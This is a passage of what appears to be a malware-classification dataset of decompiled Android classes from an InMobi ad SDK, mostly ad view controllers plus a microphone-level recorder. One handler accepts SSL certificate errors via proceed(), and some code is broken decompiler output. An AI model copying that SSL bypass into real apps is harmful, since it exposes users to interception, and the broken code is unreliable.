@Override public void run(){     if (IMWebView.this.getParent() != null) {       ((ViewGroup)IMWebView.this.getParent()).removeView(IMWebView.this);     }     IMWebView.this.b.set(true);     IMWebView.super.destroy();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\CustomView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@381c6533"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\d.code","class d implements View.OnFocusChangeListener {   d(){   }   @Override public void onFocusChange(  View view,  boolean z){     VideoView videoView;     videoView=a.this.a.j;     videoView.requestFocus();   } } public class d implements DialogInterface.OnClickListener {   final SslErrorHandler a;   d(  SslErrorHandler sslErrorHandler){     this.a=sslErrorHandler;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.cancel();     this.a.cancel();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\e.code","class e implements View.OnTouchListener {   e(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return true;   } } public class e implements DialogInterface.OnClickListener {   final SslErrorHandler a;   e(  SslErrorHandler sslErrorHandler){     this.a=sslErrorHandler;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.cancel();     this.a.proceed();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\f.code","class f implements DialogInterface.OnClickListener {   final GeolocationPermissions.Callback a;   final String b;   f(  GeolocationPermissions.Callback callback,  String str){     this.a=callback;     this.b=str;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.a.invoke(this.b,false,false);   } } !org.eclipse.jdt.core.dom.TypeDeclaration@1e54987"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\g.code","class g implements DialogInterface.OnClickListener {   final GeolocationPermissions.Callback a;   final String b;   g(  GeolocationPermissions.Callback callback,  String str){     this.a=callback;     this.b=str;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.a.invoke(this.b,true,false);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\h.code","class h implements View.OnKeyListener {   h(){   }   @Override public boolean onKey(  View view,  int i,  KeyEvent keyEvent){     VideoView videoView;     if (4 == keyEvent.getKeyCode() && keyEvent.getAction() == 0) {       Log.debug(Constants.RENDERING_LOG_TAG,""Back Button pressed when html5 video is playing"");       videoView=a.this.a.j;       videoView.stopPlayback();       a.this.a.d();     }     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\IMWebView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@205f5571"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\IMWebViewListener.code","public interface IMWebViewListener {   void onDismissAdScreen();   void onError();   void onExpand();   void onExpandClose();   void onLeaveApplication();   void onResize(  ResizeDimensions resizeDimensions);   void onResizeClose();   void onShowAdScreen();   void onUserInteraction(  Map<String,String> map); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\ViewOnKeyListenerC0024a.code","class ViewOnKeyListenerC0024a implements View.OnKeyListener {   ViewOnKeyListenerC0024a(){   }   @Override public boolean onKey(  View view,  int i,  KeyEvent keyEvent){     Log.debug(Constants.RENDERING_LOG_TAG,""Back Button pressed when html5 video is playing"");     a.this.a.d();     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\a.code","public static class a extends TimerTask {   a(){   }   @Override public void run(){     AudioTriggerer.d();   } } public class a implements AVPlayerListener {   final JSController.PlayerProperties a;   a(  JSController.PlayerProperties playerProperties){     this.a=playerProperties;   }   @Override public void onPrepared(  AVPlayer aVPlayer){   }   @Override public void onError(  AVPlayer aVPlayer){     onComplete(aVPlayer);   }   @Override public void onComplete(  AVPlayer aVPlayer){     try {       if (this.a.isFullScreen()) {         ViewGroup viewGroup=(ViewGroup)aVPlayer.getBackGroundLayout().getParent();         if (viewGroup != null) {           viewGroup.removeView(aVPlayer.getBackGroundLayout());         }       }  else {         ViewGroup viewGroup2=(ViewGroup)aVPlayer.getParent();         if (viewGroup2 != null) {           viewGroup2.removeView(aVPlayer);         }       }     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Problem removing the audio relativelayout"",e);     }   } } public class a implements Runnable {   final String a;   a(  String str){     this.a=str;   }   @Override public void run(){     String finalRedirectedUrl=InternalSDKUtil.getFinalRedirectedUrl(this.a);     if (finalRedirectedUrl != null) {       Intent intent=new Intent();       intent.setAction(""android.intent.action.VIEW"");       intent.setData(Uri.parse(finalRedirectedUrl));       intent.addFlags(268435456);       try {         MRAIDBasic.this.b.startActivity(intent);         if (MRAIDBasic.this.a.mListener != null) {           MRAIDBasic.this.a.mListener.onLeaveApplication();         }       }  catch (      Exception e) {         MRAIDBasic.this.a.raiseError(""Invalid url"",""open"");       }     }   } } public class a implements Runnable {   a(){   }   @Override public void run(){     if (MRAIDExpandController.this.a.mListener != null) {       MRAIDExpandController.this.a.mListener.onExpand();     }   } } !org.eclipse.jdt.core.dom.TypeDeclaration@587a6a4epublic class a implements View.OnClickListener {   a(){   }   @Override public void onClick(  View view){     IMWebView.userInitiatedClose=true;     MRAIDResizeController.this.a.close();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\AudioTriggerCallback.code","public interface AudioTriggerCallback {   void audioLevel(  double d); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\AudioTriggerer.code","public class AudioTriggerer {   static boolean a;   static boolean b;   static Timer c;   static long d=0;   static long e=50;   public static AudioRecord audioRecorder=null;   public static List<AudioTriggerCallback> callbacks=new ArrayList();   private static int[] f={8000,11025,22050,44100};   public static void addEventListener(  AudioTriggerCallback audioTriggerCallback){     callbacks.add(audioTriggerCallback);     if (callbacks.size() == 1) {       b();     }   }   public static void removeEventListener(  AudioTriggerCallback audioTriggerCallback){     callbacks.remove(audioTriggerCallback);     if (callbacks.size() == 0) {       c();     }   }   private static void a(  double d2){     Iterator<AudioTriggerCallback> it=callbacks.iterator();     while (it.hasNext()) {       try {         it.next().audioLevel(d2);       }  catch (      Exception e2) {         Log.internal(Constants.RENDERING_LOG_TAG,""AudioTriggerer: One of the mic listeners has a problem."");       }     }   }   private static void b(){     a=true;     audioRecorder=h();     c=new Timer();     c.scheduleAtFixedRate(new a(),d,e);   } public static class a extends TimerTask {     a(){     }     @Override public void run(){       AudioTriggerer.d();     }   }   private static void c(){     a=false;     if (audioRecorder != null) {       if (f()) {         g();       }       try {         audioRecorder.stop();         audioRecorder.release();         c.cancel();         c.purge();       }  catch (      IllegalStateException e2) {         e2.printStackTrace();       } catch (      RuntimeException e3) {         e3.printStackTrace();       }     }   }   public static void d(){     if (audioRecorder != null && audioRecorder.getState() == 1) {       short[] sArr=new short[android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY];       float[] fArr=new float[3];       b=true;       try {         audioRecorder.startRecording();         while (f()) {           int read=audioRecorder.read(sArr,0,sArr.length);           float f2=0.0f;           for (int i=0; i < read; i+=2) {             if (((short)(sArr[i] | sArr[i + 1])) != 0) {               f2+=Math.abs((int)r7) / read;             }           }           fArr[0]=f2;           float f3=0.0f;           for (int i2=0; i2 < 3; i2++) {             f3+=fArr[i2];           }           a((f3 / read) / 32.0f);         }         e();       }  catch (      Exception e2) {       }     }   }   private static void e(){     if (audioRecorder != null) {       if (f()) {         g();       }       try {         audioRecorder.stop();         audioRecorder.release();       }  catch (      IllegalStateException e2) {         e2.printStackTrace();       } catch (      RuntimeException e3) {         e3.printStackTrace();       }     }   }   private static boolean f(){     return b;   }   private static void g(){     b=false;   }   private static AudioRecord h(){     for (    int i : f) {       for (      short s : new short[]{3,2}) {         for (        short s2 : new short[]{16,12}) {           try {             int minBufferSize=AudioRecord.getMinBufferSize(i,s2,s);             if (minBufferSize != -2) {               AudioRecord audioRecord=new AudioRecord(0,i,s2,s,minBufferSize);               if (audioRecord.getState() == 1) {                 return audioRecord;               }             }  else {               continue;             }           }  catch (          Exception e2) {           }         }       }     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\b.code","public class b implements View.OnTouchListener {   b(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return true;   } } public class b implements View.OnClickListener {   b(){   }   @Override public void onClick(  View view){     IMWebView.userInitiatedClose=true;     if (!MRAIDExpandController.this.mIsExpandUrlValid) {       MRAIDExpandController.this.a.close();     }  else {       MRAIDExpandController.this.c.close();     }   } } public class b implements View.OnClickListener {   b(){   }   @Override public void onClick(  View view){     MRAIDInterstitialController.this.handleInterstitialClose();   } } public class b implements Runnable {   b(){   }   @Override public void run(){     if (MRAIDResizeController.this.a.mListener != null) {       MRAIDResizeController.this.a.mListener.onResize(MRAIDResizeController.this.b);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\c.code","public class c implements View.OnKeyListener {   c(){   }   @Override public boolean onKey(  View view,  int i,  KeyEvent keyEvent){     if (4 == keyEvent.getKeyCode() && keyEvent.getAction() == 0) {       Log.debug(Constants.RENDERING_LOG_TAG,""Back button pressed while fullscreen audio was playing"");       MRAIDAudioVideoController.this.audioplayer.releasePlayer(true);     }     return false;   } } public class c implements View.OnTouchListener {   c(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return true;   } } public class c implements View.OnKeyListener {   c(){   }   @Override public boolean onKey(  View view,  int i,  KeyEvent keyEvent){     if (4 == keyEvent.getKeyCode() && keyEvent.getAction() == 0) {       Log.debug(Constants.RENDERING_LOG_TAG,""Back Button pressed while Interstitial ad is in active state "");       MRAIDInterstitialController.this.handleInterstitialClose();     }     return false;   } } public class c implements Runnable {   c(){   }   @Override public void run(){     if (MRAIDResizeController.this.a.mListener != null) {       MRAIDResizeController.this.a.mListener.onResize(MRAIDResizeController.this.b);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3dcac3ad"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\e.code","public class e implements View.OnKeyListener {   e(){   }   @Override public boolean onKey(  View view,  int i,  KeyEvent keyEvent){     if (4 == keyEvent.getKeyCode() && keyEvent.getAction() == 0) {       Log.debug(Constants.RENDERING_LOG_TAG,""Back pressed while fullscreen video is playing"");       MRAIDAudioVideoController.this.videoPlayer.releasePlayer(true);     }     return false;   } } class e implements View.OnClickListener {   e(){   }   @Override public void onClick(  View view){     MRAIDInterstitialController.this.handleInterstitialClose();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\f.code","public class f implements AVPlayerListener {   f(){   }   @Override public void onPrepared(  AVPlayer aVPlayer){   }   @Override public void onError(  AVPlayer aVPlayer){     onComplete(aVPlayer);   }   @Override public void onComplete(  AVPlayer aVPlayer){     MRAIDAudioVideoController.this.a.setBusy(false);     try {       ViewGroup backGroundLayout=aVPlayer.getBackGroundLayout();       if (backGroundLayout != null) {         ((ViewGroup)backGroundLayout.getParent()).removeView(aVPlayer.getBackGroundLayout());       }       aVPlayer.setBackGroundLayout(null);     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Problem removing the video framelayout or relativelayout depending on video startstyle"",e);     } synchronized (this) {       if (MRAIDAudioVideoController.this.videoPlayer != null && aVPlayer.getPropertyID().equalsIgnoreCase(MRAIDAudioVideoController.this.videoPlayer.getPropertyID())) {         MRAIDAudioVideoController.this.videoPlayer=null;       }     }   } } class f implements View.OnKeyListener {   f(){   }   @Override public boolean onKey(  View view,  int i,  KeyEvent keyEvent){     if (4 == keyEvent.getKeyCode() && keyEvent.getAction() == 0) {       Log.debug(Constants.RENDERING_LOG_TAG,""Back Button pressed while Interstitial ad is in active state "");       MRAIDInterstitialController.this.handleInterstitialClose();     }     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\g.code","public class g implements View.OnTouchListener {   g(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\MRAIDAudioVideoController.code","!org.eclipse.jdt.core.dom.TypeDeclaration@f8fad22"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\MRAIDBasic.code","public class MRAIDBasic {   private IMWebView a;   private Activity b;   public MRAIDBasic(  IMWebView iMWebView,  Activity activity){     this.a=iMWebView;     this.b=activity;   }   public void open(  String str){     try {       try {         if (str.startsWith(""http://"") || (str.contains(""https"") && !str.contains(""play.google.com"") && !str.contains(""market.android.com"")&& !str.contains(""market%3A%2F%2F""))) {           if (!URLUtil.isValidUrl(str)) {             this.a.raiseError(""Invalid url"",""open"");             return;           }           Intent intent=new Intent(this.b,(Class<?>)IMBrowserActivity.class);           Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> open:"" + str);           intent.putExtra(IMBrowserActivity.EXTRA_URL,str);           if (this.a.getStateVariable() == IMWebView.ViewState.DEFAULT && !this.a.mIsInterstitialAd && !this.a.mWebViewIsBrowserActivity) {             intent.putExtra(""FIRST_INSTANCE"",true);           }           IMBrowserActivity.setWebViewListener(this.a.mListener);           try {             this.b.startActivity(intent);             if (!this.a.mWebViewIsBrowserActivity) {               this.a.fireOnShowAdScreen();               return;             }             return;           }  catch (          Exception e) {             this.a.raiseError(""Invalid url"",""open"");             return;           }         }         new Thread(new a(str)).start();       }  catch (      Exception e2) {         this.a.raiseError(""Invalid url"",""open"");       }     }  catch (    ActivityNotFoundException e3) {       Log.debug(Constants.RENDERING_LOG_TAG,""Failed to perform mraid Open"");     }   } public class a implements Runnable {     final String a;     a(    String str){       this.a=str;     }     @Override public void run(){       String finalRedirectedUrl=InternalSDKUtil.getFinalRedirectedUrl(this.a);       if (finalRedirectedUrl != null) {         Intent intent=new Intent();         intent.setAction(""android.intent.action.VIEW"");         intent.setData(Uri.parse(finalRedirectedUrl));         intent.addFlags(268435456);         try {           MRAIDBasic.this.b.startActivity(intent);           if (MRAIDBasic.this.a.mListener != null) {             MRAIDBasic.this.a.mListener.onLeaveApplication();           }         }  catch (        Exception e) {           MRAIDBasic.this.a.raiseError(""Invalid url"",""open"");         }       }     }   }   public void getCurrentPosition(){     throw new UnsupportedOperationException(""Method not decompiled: com.inmobi.re.container.mraidimpl.MRAIDBasic.getCurrentPosition():void"");   }   public void getDefaultPosition(){     throw new UnsupportedOperationException(""Method not decompiled: com.inmobi.re.container.mraidimpl.MRAIDBasic.getDefaultPosition():void"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\MRAIDExpandController.code","public class MRAIDExpandController {   public static int EXP_CLOSE_BUTTON=MRAIDInterstitialController.INT_CLOSE_BUTTON;   protected static final int PLACEHOLDER_ID=437;   protected static final int RELATIVELAYOUT_ID=438;   private IMWebView a;   private Activity b;   public JSController.ExpandProperties expandProperties;   public int initialExpandOrientation;   public Display mSensorDisplay;   public boolean useLockOrient;   public boolean tempExpPropsLock=true;   private IMWebView c=null;   public boolean mIsExpandUrlValid=false;   private IMWebView d=null;   public MRAIDExpandController(  IMWebView iMWebView,  Activity activity){     this.a=iMWebView;     this.b=activity;   }   public void doExpand(  Bundle bundle){     this.a.doNotFireVisibilityChanged.set(true);     try {       if (this.a.getOriginalParent() == null) {         this.a.saveOriginalViewParent();       }       if (((FrameLayout)this.a.getParent().getParent()).getId() == 435) {         ((ViewGroup)this.a.getParent().getParent().getParent()).removeView((View)this.a.getParent().getParent());       }     }  catch (    Exception e) {     }     try {       String string=bundle.getString(IMWebView.EXPAND_URL);       if (URLUtil.isValidUrl(string)) {         this.mIsExpandUrlValid=true;         this.c=new IMWebView(this.a.getContext(),this.a.mListener,false,false);         this.d=this.c;         this.c.publisherOrientation=this.a.publisherOrientation;         this.c.mExpandController.tempExpPropsLock=this.a.mExpandController.tempExpPropsLock;         this.c.mExpandController.expandProperties=new JSController.ExpandProperties();         this.c.mExpandController.expandProperties.x=this.a.mExpandController.expandProperties.x;         this.c.mExpandController.expandProperties.y=this.expandProperties.y;         this.c.mExpandController.expandProperties.currentX=this.expandProperties.currentX;         this.c.mExpandController.expandProperties.currentY=this.expandProperties.currentY;         this.c.mExpandController.initialExpandOrientation=this.a.mExpandController.initialExpandOrientation;         this.c.mExpandController.useLockOrient=this.a.mExpandController.useLockOrient;         this.c.mOriginalWebviewForExpandUrl=this.a;         this.c.setOriginalParent(this.a.getOriginalParent());         this.a.doNotFireVisibilityChanged.set(false);       }  else {         this.mIsExpandUrlValid=false;       }       a(this.expandProperties).setBackgroundColor(0);       this.a.mAudioVideoController.videoValidateWidth=this.expandProperties.width;       if (this.c != null) {         this.c.mAudioVideoController.videoValidateWidth=this.expandProperties.width;       }       this.a.setState(IMWebView.ViewState.EXPANDED); synchronized (this.a.mutex) {         this.a.isMutexAquired.set(false);         this.a.mutex.notifyAll();       }       if (this.mIsExpandUrlValid) {         this.c.loadUrl(string);       }       this.a.requestLayout();       this.a.invalidate();       this.a.postInHandler(new a());     }  catch (    Exception e2) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in doexpand "",e2);       this.a.setState(IMWebView.ViewState.DEFAULT); synchronized (this.a.mutex) {         this.a.isMutexAquired.set(false);         this.a.mutex.notifyAll();       }     }     this.a.doNotFireVisibilityChanged.set(false);   } public class a implements Runnable {     a(){     }     @Override public void run(){       if (MRAIDExpandController.this.a.mListener != null) {         MRAIDExpandController.this.a.mListener.onExpand();       }     }   }   public void closeExpanded(){     if (this.a.getViewState().compareTo(IMWebView.ViewState.DEFAULT) != 0) {       if (this.d != null) {         this.d.destroy();       }       if (this.a.mOriginalWebviewForExpandUrl != null) {         this.a.mOriginalWebviewForExpandUrl.setState(IMWebView.ViewState.DEFAULT);         this.a.mAudioVideoController.releaseAllPlayers();         this.a.mOriginalWebviewForExpandUrl.mAudioVideoController.releaseAllPlayers();         this.a.mOriginalWebviewForExpandUrl.mExpandController.d=null;         this.a.destroy();       }  else {         this.d=null;       } synchronized (this.a.mutex) {         this.a.isMutexAquired.set(false);         this.a.mutex.notifyAll();       }       if (!this.tempExpPropsLock && this.a.publisherOrientation == -1) {         this.tempExpPropsLock=true;       }       this.a.doNotFireVisibilityChanged.set(true);       b();       this.a.mAudioVideoController.releaseAllPlayers();       this.a.getMRAIDUrls().clear();       this.a.closeExpanded();       this.a.setVisibility(0);       this.mIsExpandUrlValid=false;       if (this.useLockOrient) {         this.b.setRequestedOrientation(this.initialExpandOrientation);       }       this.a.setState(IMWebView.ViewState.DEFAULT);       this.a.doNotFireVisibilityChanged.set(false);     }   }   private FrameLayout a(  JSController.ExpandProperties expandProperties){     FrameLayout frameLayout=(FrameLayout)((ViewGroup)this.a.getOriginalParent()).getRootView().findViewById(R.id.content);     a();     FrameLayout frameLayout2=new FrameLayout(this.a.getContext());     ViewGroup.LayoutParams layoutParams=new FrameLayout.LayoutParams(WrapperFunctions.getParamFillParent(),WrapperFunctions.getParamFillParent());     frameLayout2.setId(435);     frameLayout2.setOnTouchListener(new c());     frameLayout2.setPadding(expandProperties.x,expandProperties.y,0,0);     FrameLayout.LayoutParams layoutParams2=new FrameLayout.LayoutParams(WrapperFunctions.getParamFillParent(),WrapperFunctions.getParamFillParent());     RelativeLayout relativeLayout=new RelativeLayout(this.a.getContext());     relativeLayout.setId(RELATIVELAYOUT_ID);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(WrapperFunctions.getParamFillParent(),WrapperFunctions.getParamFillParent());     if (this.mIsExpandUrlValid) {       relativeLayout.addView(this.c,layoutParams3);     }  else {       relativeLayout.addView(this.a,layoutParams3);     }     a(relativeLayout,expandProperties.useCustomClose);     frameLayout2.addView(relativeLayout,layoutParams2);     frameLayout.addView(frameLayout2,layoutParams);     this.a.setFocusable(true);     this.a.setFocusableInTouchMode(true);     this.a.requestFocus();     return frameLayout2;   } public class c implements View.OnTouchListener {     c(){     }     @Override public boolean onTouch(    View view,    MotionEvent motionEvent){       return true;     }   }   private void a(){     try {       if (this.a.getOriginalParent() != this.a.getParent()) {         ((ViewGroup)this.a.getParent()).removeView(this.a);       }  else {         FrameLayout frameLayout=new FrameLayout(this.a.getContext());         frameLayout.setId(PLACEHOLDER_ID);         ((ViewGroup)this.a.getOriginalParent()).addView(frameLayout,this.a.getOriginalIndex(),new ViewGroup.LayoutParams(this.a.getWidth(),this.a.getHeight()));         ((ViewGroup)this.a.getParent()).removeView(this.a);       }     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in replaceByPlaceHolder "",e);     }   }   private void a(  ViewGroup viewGroup,  boolean z){     CustomView customView;     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams((int)(this.a.getDensity() * 50.0f),(int)(this.a.getDensity() * 50.0f));     layoutParams.addRule(11);     if (z) {       customView=new CustomView(this.a.getContext(),this.a.getDensity(),CustomView.SwitchIconType.CLOSE_TRANSPARENT);     }  else {       customView=new CustomView(this.a.getContext(),this.a.getDensity(),CustomView.SwitchIconType.CLOSE_BUTTON);     }     customView.setId(EXP_CLOSE_BUTTON);     viewGroup.addView(customView,layoutParams);     customView.setOnClickListener(new b());   } public class b implements View.OnClickListener {     b(){     }     @Override public void onClick(    View view){       IMWebView.userInitiatedClose=true;       if (!MRAIDExpandController.this.mIsExpandUrlValid) {         MRAIDExpandController.this.a.close();       }  else {         MRAIDExpandController.this.c.close();       }     }   }   private void b(){     if (this.c == null) {       ((ViewGroup)this.a.getParent().getParent().getParent()).removeView((View)this.a.getParent().getParent());       ((ViewGroup)this.a.getParent()).removeView(this.a);     }  else {       ((ViewGroup)this.c.getParent().getParent().getParent()).removeView((View)this.c.getParent().getParent());       ((ViewGroup)this.c.getParent()).removeView(this.c);     }     View findViewById=((View)this.a.getOriginalParent()).findViewById(PLACEHOLDER_ID);     ((ViewGroup)findViewById.getParent()).removeView(findViewById);     IMWebView iMWebView=this.a.mOriginalWebviewForExpandUrl != null ? this.a.mOriginalWebviewForExpandUrl : this.a;     ((ViewGroup)this.a.getOriginalParent()).addView(iMWebView,this.a.getOriginalIndex());     iMWebView.resetLayout();   }   public void handleOrientationFor2Piece(){     try {       int integerCurrentRotation=this.a.getIntegerCurrentRotation();       if (this.a.mInterstitialController.lockOrientationValueForInterstitial) {         if (this.a.mInterstitialController.orientationValueForInterstitial.equals(""portrait"")) {           this.b.setRequestedOrientation(WrapperFunctions.getParamPortraitOrientation(integerCurrentRotation));         }  else         if (this.a.mInterstitialController.orientationValueForInterstitial.equals(""landscape"")) {           this.b.setRequestedOrientation(WrapperFunctions.getParamLandscapeOrientation(integerCurrentRotation));         }       }     }  catch (    Exception e) {       Log.internal(Constants.RENDERING_LOG_TAG,""IMWebview Handle orientation for 2 piece "",e);     }   }   public void reset(){     this.expandProperties=new JSController.ExpandProperties();   }   public void disableEnableHardwareAccelerationForExpandWithURLView(){     if (this.d != null) {       this.d.disableHardwareAcceleration();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\MRAIDInterstitialController.code","!org.eclipse.jdt.core.dom.TypeDeclaration@199a28ea"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\MRAIDResizeController.code","public class MRAIDResizeController {   protected static final int PLACEHOLDER_ID=437;   protected static final int RELATIVELAYOUT_ID=438;   private IMWebView a;   private ResizeDimensions b=null;   public JSController.ResizeProperties resizeProperties;   public MRAIDResizeController(  IMWebView iMWebView,  Activity activity){     this.a=iMWebView;   }   public void doResize(  Bundle bundle){     this.a.doNotFireVisibilityChanged.set(true);     try {       if (this.a.getOriginalParent() == null) {         this.a.saveOriginalViewParent();       }       if (((FrameLayout)this.a.getParent().getParent()).getId() == 435) {         a((FrameLayout)this.a.getParent().getParent().getParent(),(FrameLayout)this.a.getParent().getParent(),this.a,this.resizeProperties);         RelativeLayout.LayoutParams a2=a(this.resizeProperties.customClosePosition);         this.a.setLayoutParams(new RelativeLayout.LayoutParams(this.resizeProperties.width,this.resizeProperties.height));         ((ViewGroup)this.a.getParent()).getChildAt(1).setLayoutParams(a2);         if (bundle != null) {           this.a.setState(IMWebView.ViewState.RESIZED);         }         this.a.requestLayout();         this.a.invalidate();         this.a.postInHandler(new b());         this.a.doNotFireVisibilityChanged.set(false);         return;       }     }  catch (    Exception e) {     }     try {       a(this.resizeProperties).setBackgroundColor(0);       this.a.mAudioVideoController.videoValidateWidth=this.resizeProperties.width;       if (bundle != null) {         this.a.setState(IMWebView.ViewState.RESIZED);       } synchronized (this.a.mutex) {         this.a.isMutexAquired.set(false);         this.a.mutex.notifyAll();       }       this.a.requestLayout();       this.a.invalidate();       this.a.postInHandler(new c());     }  catch (    Exception e2) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in doresize "",e2);       this.a.setState(IMWebView.ViewState.DEFAULT); synchronized (this.a.mutex) {         this.a.isMutexAquired.set(false);         this.a.mutex.notifyAll();       }     }     this.a.doNotFireVisibilityChanged.set(false);   } public class b implements Runnable {     b(){     }     @Override public void run(){       if (MRAIDResizeController.this.a.mListener != null) {         MRAIDResizeController.this.a.mListener.onResize(MRAIDResizeController.this.b);       }     }   } public class c implements Runnable {     c(){     }     @Override public void run(){       if (MRAIDResizeController.this.a.mListener != null) {         MRAIDResizeController.this.a.mListener.onResize(MRAIDResizeController.this.b);       }     }   }   public void closeResized(){     if (this.a.getViewState().compareTo(IMWebView.ViewState.DEFAULT) != 0) { synchronized (this.a.mutex) {         this.a.isMutexAquired.set(false);         this.a.mutex.notifyAll();       }       this.a.doNotFireVisibilityChanged.set(true);       b();       this.a.closeResized();       this.a.setVisibility(0);       this.a.setState(IMWebView.ViewState.DEFAULT);       this.a.doNotFireVisibilityChanged.set(false);     }   }   private FrameLayout a(  JSController.ResizeProperties resizeProperties){     FrameLayout frameLayout=(FrameLayout)((ViewGroup)this.a.getOriginalParent()).getRootView().findViewById(R.id.content);     a();     FrameLayout frameLayout2=new FrameLayout(this.a.getContext());     ViewGroup.LayoutParams layoutParams=new FrameLayout.LayoutParams(WrapperFunctions.getParamFillParent(),WrapperFunctions.getParamFillParent());     frameLayout2.setId(435);     ViewGroup.LayoutParams layoutParams2=new FrameLayout.LayoutParams(resizeProperties.width,resizeProperties.height);     RelativeLayout relativeLayout=new RelativeLayout(this.a.getContext());     relativeLayout.setId(RELATIVELAYOUT_ID);     relativeLayout.addView(this.a,new RelativeLayout.LayoutParams(resizeProperties.width,resizeProperties.height));     a(relativeLayout,resizeProperties.customClosePosition);     frameLayout2.addView(relativeLayout,layoutParams2);     a(frameLayout,frameLayout2,this.a,resizeProperties);     frameLayout.addView(frameLayout2,layoutParams);     this.a.setFocusable(true);     this.a.setFocusableInTouchMode(true);     this.a.requestFocus();     return frameLayout2;   }   private void a(  FrameLayout frameLayout,  FrameLayout frameLayout2,  IMWebView iMWebView,  JSController.ResizeProperties resizeProperties){     int[] iArr=new int[2];     ((View)iMWebView.getOriginalParent()).getLocationOnScreen(r1);     frameLayout.getLocationOnScreen(iArr);     int[] iArr2={iArr2[0] - iArr[0],iArr2[1] - iArr[1]};     iArr2[0]=iArr2[0] + resizeProperties.offsetX;     iArr2[1]=iArr2[1] + resizeProperties.offsetY;     if (!resizeProperties.allowOffscreen) {       if (resizeProperties.width > frameLayout.getWidth() - iArr2[0]) {         iArr2[0]=frameLayout.getWidth() - resizeProperties.width;       }       if (resizeProperties.height > frameLayout.getHeight() - iArr2[1]) {         iArr2[1]=frameLayout.getHeight() - resizeProperties.height;       }       if (iArr2[0] < 0) {         iArr2[0]=0;       }       if (iArr2[1] < 0) {         iArr2[1]=0;       }     }     this.b=new ResizeDimensions(iArr2[0],iArr2[1],resizeProperties.width,resizeProperties.height);     FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(resizeProperties.width,resizeProperties.height);     layoutParams.leftMargin=iArr2[0];     layoutParams.topMargin=iArr2[1];     layoutParams.gravity=3;     